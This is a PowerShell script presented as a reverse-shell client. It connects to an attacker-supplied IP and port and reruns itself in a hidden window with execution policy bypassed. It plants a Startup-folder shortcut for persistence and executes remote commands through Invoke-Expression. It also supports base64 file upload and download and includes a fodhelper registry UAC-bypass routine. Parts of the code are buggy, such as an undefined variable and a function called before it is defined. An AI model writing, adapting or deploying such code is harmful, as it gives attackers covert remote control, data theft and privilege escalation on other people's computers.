# client.ps1

$ip = "192.168.1.10" # Replace with the attacker's IP address
$port = 4444         # Replace with the attacker's listening port
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$reader = New-Object System.IO.StreamReader($stream)
$buffer = New-Object byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

# Get the path of the Startup folder for the current user
$StartupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')

# Get the full path of the script file
$ScriptPath = $MyInvocation.MyCommand.Path

# Define the path for the shortcut
$ShortcutPath = [System.IO.Path]::Combine($StartupFolder, 'MyScript.lnk') # Edit the filename to fit your needs

# Check if the '-HiddenWindow' argument is present
if ($args -contains '-HiddenWindow') {
    # Check if the shortcut already exists
    if (Test-Path $ShortcutPath) {
        Write-Host "Shortcut already exists: $ShortcutPath"
    } else {
        # Create a WScript.Shell COM object
        $WScriptShell = New-Object -ComObject WScript.Shell

        # Create the shortcut
        $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
        $Shortcut.TargetPath = 'powershell.exe'
        $Shortcut.Arguments = "-WindowStyle hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
        $Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($ScriptPath)
        $Shortcut.Save()

        Write-Host "Shortcut created in Startup folder: $ShortcutPath"
    }
    Main
} else {
    Write-Output "Script is running in normal mode."
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command '& {`"$ScriptPath`" -HiddenWindow}'"
}

function Main {
    # Main shell loop
    while ($true) {
        $writer.Write("PS> ")
        $writer.Flush()
        $cmd = $reader.ReadLine()

        if ($cmd -eq "exit") { break }
    
        # Handle file download command
        elseif ($cmd.StartsWith("Get-Content")) {
           try {
               $filePath = $cmd -replace 'Get-Content -Path ', '' -replace ' -Encoding Byte', ''
                $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
                $response = [Convert]::ToBase64String($fileBytes)
            } catch {
                $response = "Error: Unable to read file - " + $_.Exception.Message
            }
            $writer.WriteLine($response)
            $writer.Flush()
        }

        # Handle file upload command
        elseif ($cmd.StartsWith("Set-Content")) {
            try {
                $pattern = "Set-Content -Path (.+) -Value \[System.Convert\]::FromBase64String'(.+)' -Encoding Byte"
                if ($cmd -match $pattern) {
                    $filePath = $matches[1]
                    $fileContentBase64 = $matches[2]
                    $fileBytes = [Convert]::FromBase64String($fileContentBase64)
                    [System.IO.File]::WriteAllBytes($filePath, $fileBytes)
                    $response = "File uploaded successfully to $filePath"
              } else {
                    $response = "Error: Invalid upload command format."
                }
            } catch {
                $response = "Error: Unable to write file - " + $_.Exception.Message
            }
            $writer.WriteLine($response)
            $writer.Flush()
        }

        if ($command.StartsWith("sudo ")) {
            $cmd = $command.Substring(5) # Remove 'sudo ' from the command string

            #add command into registry process 
            New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "$cmd" -Force
            New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
            $bypass = Start-Process "C:\Windows\System32\fodhelper.exe"

            try {
                #start fodhelper.exe to execute command in the registry
                $output = Invoke-Expression $bypass 2>&1 | Out-String
                #sleep 1 sec to prevent some weird popup occurs & caused code execution fails
                Start-Sleep -Seconds 1
                #cleanup created registry value
                Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
                $writer.WriteLine($output)
                $writer.Flush()
            } catch {
                $writer.WriteLine("Error: " + $_.Exception.Message)
                $writer.Flush()
            }
        }

        else {
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.WriteLine($output)
                $writer.Flush()
            } catch {
                $writer.WriteLine("Error: " + $_.Exception.Message)
                $writer.Flush()
            }
        }
    }
}

$writer.Close()
$reader.Close()
$stream.Close()
$client.Close()
